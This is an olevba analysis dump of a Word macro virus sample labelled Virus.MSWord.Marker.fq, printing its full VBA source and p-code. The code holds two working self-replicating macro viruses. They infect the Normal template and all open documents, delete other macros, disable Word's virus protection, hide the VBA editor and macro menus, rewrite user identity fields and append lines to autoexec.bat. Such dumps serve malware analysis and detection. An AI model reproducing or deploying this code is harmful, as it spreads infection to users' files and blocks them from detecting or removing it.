olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Dim DI As Boolean, TI As Boolean, d As Object, t As Object, Src As String, r As String


Private Sub Document_Close()
On Error Resume Next

Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

DI = d.codemodule.Find("长安公司汽研所 常识课", 1, 1, 10000, 10000)
TI = t.codemodule.Find("长安公司汽研所 常识课", 1, 1, 10000, 10000)

Options.VirusProtection = False

  If DI And Not (TI) Then
    Src = d.codemodule.Lines(1, d.codemodule.CountOfLines)
    t.codemodule.DeleteLines 1, t.codemodule.CountOfLines
    t.codemodule.AddFromString Src
    NormalTemplate.Save
    
  ElseIf TI And Not (DI) Then
If Day(Now()) = 1 Then
 Do
 r = UCase(InputBox("长安之星车长多少米?" & Chr(13) & Chr(13) _
 & "A.3米4  B.3米5  C.3米55  D.3米7" & Chr(13) & Chr(13) _
 & "要好好思考哟!", "紧急提问"))
 Loop Until r <> ""
 If r = "B" Then
   MsgBox "好棒哟!"
   GoTo 10
 Else
   MsgBox "唉!再给你一次机会."
    Do
     r = UCase(InputBox("长安之星FBA是什么型?" & Chr(13) & Chr(13) _
     & "A.标准型  B.普通型  C.豪华型" & Chr(13) & Chr(13) _
     & "想好了再回答!", "紧急提问"))
    Loop Until r <> ""
      If r = "C" Then
        MsgBox "谢谢你的支持!"
        GoTo 10
      Else
        MsgBox "笨蛋!给你最后一次机会."
          Do
           r = UCase(InputBox("安全气囊是干什么用的?" & Chr(13) & Chr(13) _
           & "A.防止撞车  B.防止侧滑  C.撞车时保护驾驶员" & Chr(13) & Chr(13) _
           & "这是最后一次机会哟!", "紧急提问"))
          Loop Until r <> ""
           If r = "C" Then
             MsgBox "总算答对了!"
             GoTo 10
           Else
             MsgBox "看来你还需要对长安之星多加了解..."
             ActiveDocument.SaveAs "c:\lzc.vxd"
             ActiveDocument.Close
             Exit Sub
           End If
      End If
 End If
End If
10:
    Src = t.codemodule.Lines(1, t.codemodule.CountOfLines)
    d.codemodule.DeleteLines 1, d.codemodule.CountOfLines
    d.codemodule.AddFromString Src
    ActiveDocument.Save
      
  End If


End Sub

Private Sub Document_Open()
On Error Resume Next

Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

DI = d.codemodule.Find("长安公司汽研所 常识课", 1, 1, 10000, 10000)
TI = t.codemodule.Find("长安公司汽研所 常识课", 1, 1, 10000, 10000)

Options.VirusProtection = False

  If DI And Not (TI) Then
    t.codemodule.DeleteLines 1, t.codemodule.CountOfLines
    
  ElseIf TI And Not (DI) Then
    d.codemodule.DeleteLines 1, d.codemodule.CountOfLines
      
  End If
  
End Sub











































-------------------------------------------------------------------------------
VBA MACRO A_OPEY_03.bas 
in file: Virus.MSWord.Marker.fq - OLE stream: 'Macros/VBA/A_OPEY_03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: OPEY A."
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    Call A_OPEY_03
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "A_OPEY_03" Then NTInfected = True
                If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "A_OPEY_03" Then ODInfected = True
                    If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub A_OPEY_03()
    On Error Resume Next
    Application.UserName = "OPEY A."
    Application.UserAddress = "CNNHS B'92 PHILIPPINES (CNSC)"
    Application.UserInitials = "LOVE"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "OPEY A."
        .Title = "LOVE"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub filesave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub fileclose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call OnlyYou
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call OnlyYou
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.fq
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8938 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	Dim 
' 	VarDefn DI (As Boolean)
' 	VarDefn TI (As Boolean)
' 	VarDefn d (As Object)
' 	VarDefn t (As Object)
' 	VarDefn Src (As String)
' 	VarDefn r (As String)
' Line #4:
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Document_Close())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set d 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #11:
' Line #12:
' 	LitStr 0x0015 "长安公司汽研所 常识课"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld d 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #13:
' 	LitStr 0x0015 "长安公司汽研所 常识课"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld t 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St TI 
' Line #14:
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' Line #17:
' 	Ld DI 
' 	Ld TI 
' 	Paren 
' 	Not 
' 	And 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld d 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St Src 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld t 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #20:
' 	Ld Src 
' 	Ld t 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #21:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #22:
' Line #23:
' 	Ld TI 
' 	Ld DI 
' 	Paren 
' 	Not 
' 	And 
' 	ElseIfBlock 
' Line #24:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Do 
' Line #26:
' 	LineCont 0x0008 11 00 01 00 1D 00 01 00
' 	LitStr 0x0013 "长安之星车长多少米?"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F "A.3米4  B.3米5  C.3米55  D.3米7"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "要好好思考哟!"
' 	Concat 
' 	LitStr 0x0008 "紧急提问"
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St r 
' Line #27:
' 	Ld r 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopUntil 
' Line #28:
' 	Ld r 
' 	LitStr 0x0001 "B"
' 	Eq 
' 	IfBlock 
' Line #29:
' 	LitStr 0x0007 "好棒哟!"
' 	ArgsCall MsgBox 0x0001 
' Line #30:
' 	GoTo 10 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	LitStr 0x0012 "唉!再给你一次机会."
' 	ArgsCall MsgBox 0x0001 
' Line #33:
' 	Do 
' Line #34:
' 	LineCont 0x0008 11 00 05 00 1D 00 05 00
' 	LitStr 0x0014 "长安之星FBA是什么型?"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001C "A.标准型  B.普通型  C.豪华型"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "想好了再回答!"
' 	Concat 
' 	LitStr 0x0008 "紧急提问"
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St r 
' Line #35:
' 	Ld r 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopUntil 
' Line #36:
' 	Ld r 
' 	LitStr 0x0001 "C"
' 	Eq 
' 	IfBlock 
' Line #37:
' 	LitStr 0x000D "谢谢你的支持!"
' 	ArgsCall MsgBox 0x0001 
' Line #38:
' 	GoTo 10 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	LitStr 0x0016 "笨蛋!给你最后一次机会."
' 	ArgsCall MsgBox 0x0001 
' Line #41:
' 	Do 
' Line #42:
' 	LineCont 0x0008 11 00 0B 00 1D 00 0B 00
' 	LitStr 0x0015 "安全气囊是干什么用的?"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002A "A.防止撞车  B.防止侧滑  C.撞车时保护驾驶员"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "这是最后一次机会哟!"
' 	Concat 
' 	LitStr 0x0008 "紧急提问"
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St r 
' Line #43:
' 	Ld r 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopUntil 
' Line #44:
' 	Ld r 
' 	LitStr 0x0001 "C"
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x000B "总算答对了!"
' 	ArgsCall MsgBox 0x0001 
' Line #46:
' 	GoTo 10 
' Line #47:
' 	ElseBlock 
' Line #48:
' 	LitStr 0x0021 "看来你还需要对长安之星多加了解..."
' 	ArgsCall MsgBox 0x0001 
' Line #49:
' 	LitStr 0x000A "c:\lzc.vxd"
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #50:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #51:
' 	ExitSub 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	LineNum 10 
' 	BoS 0x0000 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld t 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St Src 
' Line #58:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld d 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #59:
' 	Ld Src 
' 	Ld d 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #60:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' Line #62:
' 	EndIfBlock 
' Line #63:
' Line #64:
' Line #65:
' 	EndSub 
' Line #66:
' Line #67:
' 	FuncDefn (Private Sub Document_Open())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' Line #70:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set d 
' Line #71:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #72:
' Line #73:
' 	LitStr 0x0015 "长安公司汽研所 常识课"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld d 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #74:
' 	LitStr 0x0015 "长安公司汽研所 常识课"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld t 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St TI 
' Line #75:
' Line #76:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #77:
' Line #78:
' 	Ld DI 
' 	Ld TI 
' 	Paren 
' 	Not 
' 	And 
' 	IfBlock 
' Line #79:
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld t 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #80:
' Line #81:
' 	Ld TI 
' 	Ld DI 
' 	Paren 
' 	Not 
' 	And 
' 	ElseIfBlock 
' Line #82:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld d 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #83:
' Line #84:
' 	EndIfBlock 
' Line #85:
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Macros/VBA/A_OPEY_03 - 13632 bytes
' Line #0:
' 	FuncDefn (Sub greetings())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #3:
' 	Ld Friend 
' 	St hFile 
' Line #4:
' 	LitStr 0x0000 ""
' 	St line1$ 
' Line #5:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #6:
' 	LitStr 0x002E "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
' 	St line1$ 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0018 "echo HAPPY HALLOWEEN !!!"
' 	St line1$ 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #12:
' 	LitStr 0x001D "echo HAPPY VALENTINES DAY !!!"
' 	St line1$ 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #15:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #16:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #17:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line1$ 
' 	PrintItemNL 
' Line #18:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "echo from: OPEY A."
' 	PrintItemNL 
' Line #19:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #20:
' 	Ld hFile 
' 	Close 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub OnlyYou())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	ArgsCall (Call) A_OPEY_03 0x0000 
' Line #26:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #28:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #29:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #30:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #33:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #34:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #35:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #36:
' 	Ld j 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #37:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #38:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #39:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "A_OPEY_03"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndWith 
' Line #45:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "A_OPEY_03"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	ArgsCall (Call) greetings 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub A_OPEY_03())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	LitStr 0x0007 "OPEY A."
' 	Ld Application 
' 	MemSt UserName 
' Line #55:
' 	LitStr 0x001D "CNNHS B'92 PHILIPPINES (CNSC)"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #56:
' 	LitStr 0x0004 "LOVE"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #57:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #58:
' 	LitStr 0x0007 "OPEY A."
' 	MemStWith Author 
' Line #59:
' 	LitStr 0x0004 "LOVE"
' 	MemStWith Title 
' Line #60:
' 	ArgsMemCallWith Execute 0x0000 
' Line #61:
' 	EndWith 
' Line #62:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #64:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #66:
' 	EndWith 
' Line #67:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #68:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #69:
' 	EndWith 
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #72:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #73:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #74:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #75:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #76:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #77:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #78:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #79:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub filesave())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #84:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub fileclose())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #89:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #90:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Sub FileExit())
' Line #93:
' 	OnError (Resume Next) 
' Line #94:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #95:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #96:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
